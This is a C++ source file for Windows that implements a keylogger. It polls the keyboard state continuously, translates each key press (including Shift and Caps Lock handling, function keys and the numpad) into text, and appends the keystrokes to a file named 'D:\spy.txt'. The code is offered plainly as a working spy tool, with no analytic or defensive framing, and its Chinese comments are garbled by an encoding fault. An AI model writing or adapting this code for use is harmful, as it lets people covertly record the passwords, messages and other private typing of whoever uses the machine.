#include <windows.h>
#include <Winuser.h>
#include <string>
#include <fstream>
#include <iostream>
using namespace std;
string GetKey(int Key) // P???訾Uぐ\?
{
string KeyString = "";
//P?才??J
const int KeyPressMask=0x80000000; //??被?`q
int iShift=GetKeyState(0x10); //P?Shift???
bool IS=(iShift & KeyPressMask)==KeyPressMask; //恁塬訾UShift?
if(Key >=186 && Key <=222)
{
switch(Key)
{
case 186:
if(IS)
KeyString = ":";
else
KeyString = ";";
break;
case 187:
if(IS)
KeyString = "+";
else
KeyString = "=";
break;
case 188:
if(IS)
KeyString = "<";
else
KeyString = ",";
break;
case 189:
if(IS)
KeyString = "_";
else
KeyString = "-";
break;
case 190:
if(IS)
KeyString = ">";
else
KeyString = ".";
break;
case 191:
if(IS)
KeyString = "?";
else
KeyString = "/";
break;
case 192:
if(IS)
KeyString = "~";
else
KeyString = "`";
break;
case 219:
if(IS)
KeyString = "{";
else
KeyString = "[";
break;
case 220:
if(IS)
KeyString = "|";
else
KeyString = "\\";
break;
case 221:
if(IS)
KeyString = "}";
else
KeyString = "]";
break;
case 222:
if(IS)
KeyString = '"';
else
KeyString = "'";
break;
}
}
//P???翰膜@
if (Key == VK_ESCAPE) // hX
KeyString = "[Esc]";
else if (Key == VK_F1) // F1F12
KeyString = "[F1]";
else if (Key == VK_F2)
KeyString = "[F2]";
else if (Key == VK_F3)
KeyString = "[F3]";
else if (Key == VK_F4)
KeyString = "[F4]";
else if (Key == VK_F5)
KeyString = "[F5]";
else if (Key == VK_F6)
KeyString = "[F6]";
else if (Key == VK_F7)
KeyString = "[F7]";
else if (Key == VK_F8)
KeyString = "[F8]";
else if (Key == VK_F9)
KeyString = "[F9]";
else if (Key == VK_F10)
KeyString = "[F10]";
else if (Key == VK_F11)
KeyString = "[F11]";
else if (Key == VK_F12)
KeyString = "[F12]";
else if (Key == VK_SNAPSHOT) // ゴL坦
KeyString = "[PrScrn]";
else if (Key == VK_SCROLL) // ???w
KeyString = "[Scroll Lock]";
else if (Key == VK_PAUSE) // ?氨Bい?
KeyString = "[Pause]";
else if (Key == VK_CAPITAL) // j??w
KeyString = "[Caps Lock]";

//-------------------------------------//
//北?
else if (Key == 8) //<- ^?
KeyString = "[Backspace]";
else if (Key == VK_RETURN) // ^??B?
KeyString = "[Enter]\n";
else if (Key == VK_SPACE) // 女
KeyString = " ";
//W??:?????浴AiHぃ??C??ShiftOぃ?Τヴ螃r才A
//W??M???XA?X?Τr才?X
/*
else if (Key == VK_LSHIFT) // オ?W??
KeyString = "[Shift]";
else if (Key == VK_LSHIFT) // k?W??
KeyString = "[SHIFT]";
*/
/*pGuO????J害rダ???:iHぃ?HU??X欷濂*/
else if (Key == VK_TAB) // 瞠?
KeyString = "[Tab]";
else if (Key == VK_LCONTROL) // オ北?
KeyString = "[Ctrl]";
else if (Key == VK_RCONTROL) // k北?
KeyString = "[CTRL]";
else if (Key == VK_LMENU) // オ???
KeyString = "[Alt]";
else if (Key == VK_LMENU) // k???
KeyString = "[ALT]";
else if (Key == VK_LWIN) // k WINDOWS ?
KeyString = "[Win]";
else if (Key == VK_RWIN) // k WINDOWS ?
KeyString = "[WIN]";
else if (Key == VK_APPS) // ??W k?
KeyString = "k?";
else if (Key == VK_INSERT) // 础J
KeyString = "[Insert]";
else if (Key == VK_DELETE) // ?埃
KeyString = "[Delete]";
else if (Key == VK_HOME) // _l
KeyString = "[Home]";
else if (Key == VK_END) // ?
KeyString = "[End]";
else if (Key == VK_PRIOR) // W@?
KeyString = "[PgUp]";
else if (Key == VK_NEXT) // U@?
KeyString = "[PgDown]";
// ぃ`ノ氦L??:@???Τ
else if (Key == VK_CANCEL) // Cancel
KeyString = "[Cancel]";
else if (Key == VK_CLEAR) // Clear
KeyString = "[Clear]";
else if (Key == VK_SELECT) //Select
KeyString = "[Select]";
else if (Key == VK_PRINT) //Print
KeyString = "[Print]";
else if (Key == VK_EXECUTE) //Execute
KeyString = "[Execute]";

//----------------------------------------//
else if (Key == VK_LEFT) //WBUBオBk?
KeyString = "[■]";
else if (Key == VK_RIGHT)
KeyString = "[△]";
else if (Key == VK_UP)
KeyString = "[◆]";
else if (Key == VK_DOWN)
KeyString = "[□]";
else if (Key == VK_NUMLOCK)//p?????w
KeyString = "[NumLock]";
else if (Key == VK_ADD) // [B?B肌B埃
KeyString = "+";
else if (Key == VK_SUBTRACT)
KeyString = "-";
else if (Key == VK_MULTIPLY)
KeyString = "*";
else if (Key == VK_DIVIDE)
KeyString = "/";
else if (Key == 190 || Key == 110) // p?? . の?? .
KeyString = ".";
//p???r?:0-9
else if (Key == VK_NUMPAD0)
KeyString = "0";
else if (Key == VK_NUMPAD1)
KeyString = "1";
else if (Key == VK_NUMPAD2)
KeyString = "2";
else if (Key == VK_NUMPAD3)
KeyString = "3";
else if (Key == VK_NUMPAD4)
KeyString = "4";
else if (Key == VK_NUMPAD5)
KeyString = "5";
else if (Key == VK_NUMPAD6)
KeyString = "6";
else if (Key == VK_NUMPAD7)
KeyString = "7";
else if (Key == VK_NUMPAD8)
KeyString = "8";
else if (Key == VK_NUMPAD9)
KeyString = "9";
//-------------------------------------------//

//-------------------------------------------//
//*?rダ氦jp??妲P?*//
else if (Key >=97 && Key <= 122) // rダ:a-z
{
if (GetKeyState(VK_CAPITAL)) // j??w
{
if(IS) //Shift訾U:?p?rダ
KeyString = Key;
else // uΤj??w:?Xj?rダ
KeyString = Key - 32;
}
else// j??Τ?w
{
if(IS) // 訾UShift?: j?rダ
KeyString = Key - 32;
else // ?ΤShift?: p?rダ
KeyString = Key;
}
}
else if (Key >=48 && Key <= 57) // ???r:0-9のWよ翰?
{
if(IS)
{
switch(Key)
{
case 48: //0
KeyString = ")";
break;
case 49://1
KeyString = "!";
break;
case 50://2
KeyString = "@";
break;
case 51://3
KeyString = "#";
break;
case 52://4
KeyString = "$";
break;
case 53://5
KeyString = "%";
break;
case 54://6
KeyString = "^";
break;
case 55://7
KeyString = "&";
break;
case 56://8
KeyString = "*";
break;
case 57://9
KeyString = "(";
break;
}
}
else
KeyString = Key;
}
if (Key != VK_LBUTTON || Key != VK_RBUTTON)
{
if (Key >=65 && Key <=90) //ASCII 65-90 ?A-Z
{
if (GetKeyState(VK_CAPITAL)) // j??w:?XA-Z
{
if(IS) // j??wA}B訾UW??:?X?p?rダ
KeyString = Key + 32;
else //uΤj??w:?X?j?rダ
KeyString = Key;
}
else // j??Τ?w:a-z
{
if(IS)
{
KeyString = Key;
}
else
{
Key = Key + 32;
KeyString = Key;
}
}
}
}

return KeyString;
}

void main()
{
string Filename = "D:\\spy.txt";
string TempString = "";
fstream FStream;
cout<<"}lO魁";
FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
while(true)
{
Sleep(5);
for(int i = 8; i <=255; i++)
{
if(GetAsyncKeyState(i)&1 ==1)
{
TempString = GetKey (i);
FStream.write(TempString.c_str(), TempString.size());
FStream.close();
FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
}
}
}

}
